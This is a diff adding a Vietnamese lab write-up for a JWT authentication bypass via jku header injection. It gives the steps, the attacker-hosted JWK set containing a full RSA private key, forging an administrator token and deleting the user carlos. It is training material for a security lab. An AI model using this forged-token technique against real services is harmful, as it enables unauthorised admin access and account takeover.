@@ -31,6 +31,30 @@ Sở dĩ chúng ta có thể exploit như vậy vì server đã mặc định l�
 Thay đổi path thành `/admin/delete?username=carlos`, kết quả bài lab được giải.
 
 # 5. JWT authentication bypass via jku header injection
+Đăng nhập với credentials wiener:peter. Sử dụng JWT Editor Keys để tạo một RSA Keys mới, sau đó dùng Burp Repeater bắt request tới `/admin`, vào tab "JSON Web Token" để thay đổi giá trị từ `"sub": "administrator"`, đồng thời trong phần header thêm thuộc tính `"jku": "https://exploit-0af300b9039deb6dc005a86501c800cc.exploit-server.net/exploit"`.
+
+Tiếp đó, vào exploit server, cấu hình đoạn body chính là một mảng các keys, trong đó có keys đã được tạo trước đó sau:
+```
+{
+  "keys": [
+    {
+      "p": "9Y6EfMdtHPVajG3js4ca64X7ipp5NnyAfXWK9CLB_YpmNhJ0z1u23hroywrcjPfeDCc7m-NK1Eel89qI0peBFBkElvD1YUIHhP4UO1ZqtEZlHwAAqGTzKyPUWqX0SI9HHoa2B7EPtW8dcNfOcDDZtVCNdh30OVJspcmPJ9rIjnE",
+      "kty": "RSA",
+      "q": "vvpH4KZH1LljcsWW3zldZ1BQRYpuAfDV3Ab8JTy7EAr4pbsFDCXZbZzbCPeR6rVXabeio7b4p84rxRIRxXT982Wr7rzQ1EmPTA8nGWYg8syU-zw9en8VTiLCaAN2VtDTBZcomd7n_9403eaVFXOoS0G_K5cjNYam3AQ_K6JtEIc",
+      "d": "T7LYSHgF2D8RJThM_V873rFd11QoFZaZ4lsxHvIhHUt1SNnT1Y4clDuzK_qYVnHWhEK08-q6Q37csUNXXxg3XT6uLzYe8nijHr85tNiEH8iLBlXC4MyOz8ufFuQGcwS3k0ebAUiHudo9jtQCdWoNP-f62kByWil4nU5B8dyWmUP3jR5Buyj6Ny0jFxRpXwFnKFVuRYTExnvaP9bs9JKr9Pb9gDtdwadbVHe606Vxpc80gNbDgu5Yiib9fOWFi0xhbDhRwxTa9eTfkMCu7DwnVadWd9p34MfadelAeVOFeg1yJxT7x41TTtBxSjwaVNoyBVxv_Isw8_Cy6tK2nF1qoQ",
+      "e": "AQAB",
+      "kid": "54518cf4-7917-471d-bd3e-552093192bd8",
+      "qi": "mfyjGJN6D1dMfmovTfzhSAutaHl0LSHgHhB9KkVtEvKc6q5-8fozb60_0M6gd809lffRLhui0eDuJZH1IglTUUmbFwq850okqmyFyn5Yyc2v0R22ffiiqqqtVCPIrvqE-K4lNfAhB_7Kd9Ocb9IiRxrIJrDR_TyI6JaOmdGLr8Q",
+      "dp": "g1tTwDQmSGFvqMN4FSdm3Sr1HnX39Y-wZGymgma9g1Wvy6kf13TmY_XdJhCPXtGRdMrf9komU1xoiAQVQSJOqGOhsuT_PqHFx_zq8bsOpZUqruSfdXVbJ26pQDyaat5KWygQ5BhxoMrp4t1uz1EyhO2sXs0zQh63hBBIhjdhJeE",
+      "dq": "Mc3NXt2eT_CE6dJzlQU9wYqlVG1UYPcwnm_H4-Ihmn5x9659E3zvZfGJAZ6mlAH0qOI17OHzmLdgnMUok0j-TTJPkzP0ddg1IY22EZ6bqxYFKDu-gKqRoM3ZywxUGTHeRk_0S6Rg9k45lUDj0jNWSUH9G94PVY8nBquo2bVDIhM",
+      "n": "ty_YdADPlQWkVWEVu9IBiyqtzzGQc1eY3XzkrhoFE5ra4JOldOggs8kC3Hh03yZWVjig4T8J57b0KJ5P6UyLbdnD2BEmbHkK5za-wUCSdSxw8A1xSPZKeD36Ac5BA0Bs0VUExoZ8qLP-LZH9n-HbS8whPW7A5YVvNDeNJl6L2H0u1p76XXQPkquFlQh_jQWgYX4yMkW4Zd95QhI5193zyQ75LEAZe-GhbsMvMnWN1mQo4av7VBHLMGZiAPLtUI977oD0ZQKbYnLjq2D7u7hetz364Cj7GdQ7FulGZcFqI40lkSKT_e0xe6XKEUxoaJ4vJbE12_FHiGujKck0EMctlw"
+    }
+  ]
+}
+```
+Trở lại tab JSON Web Token, click "Sign" để tiến hành signing với RSA key đã tạo. Click "Send", ta thấy access trang admin thành công.
+
+Thay đổi path thành `/admin/delete?username=carlos`, bài lab được giải.
 
 # 6. JWT authentication bypass via kid header path traversal
 
